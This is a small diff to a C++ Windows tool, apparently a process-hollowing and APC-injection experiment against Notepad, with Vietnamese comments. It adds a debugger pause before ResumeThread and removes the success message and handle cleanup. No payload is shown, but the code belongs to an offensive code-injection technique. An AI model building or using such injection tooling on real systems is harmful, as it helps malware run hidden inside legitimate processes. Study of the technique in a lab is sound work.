@@ -160,16 +160,13 @@ int main() {
         std::cerr << "[-] Lat quyen EntryPoint de ghi de that bai! Error: " << GetLastError() << std::endl;
     }
 
+    // ── GÀI ĐIỂM DỪNG CHIẾN LƯỢC TẠI ĐÂY ĐỂ ĐÍNH KÈM DEBUGGER ──
+    std::cout << "\n[*] PAUSE: Notepad is currently FROZEN in memory." << std::endl;
+    std::cout << "[*] Open x64dbg NOW, attach to PID: " << std::dec << pi.dwProcessId << std::endl;
+    std::cout << "[*] Press Enter HERE only AFTER you have followed EntryPoint in x64dbg..." << std::endl;
+    std::cin.get();
+
     // ─── BƯỚC 7: KÍCH HOẠT RÃ ĐÔNG ĐỂ LUỒNG TỰ ĐỘNG KHAI HỎA CHIẾN DỊCH ───
     std::cout << "[*] Kich hoat ra dong (ResumeThread) de luong tu dong kich no APC..." << std::endl;
     ResumeThread(pi.hThread);
-
-    std::cout << "\n[+] Process Hollowing (Active Path Custom) Successful!" << std::endl;
-    std::cout << "[*] Nhan phim Enter de don dep va dong cua so..." << std::endl;
-    std::cin.get();
-
-    // Thu hồi triệt để tài nguyên chống rò rỉ bộ nhớ (Memory Leak)
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    return EXIT_SUCCESS;
 }
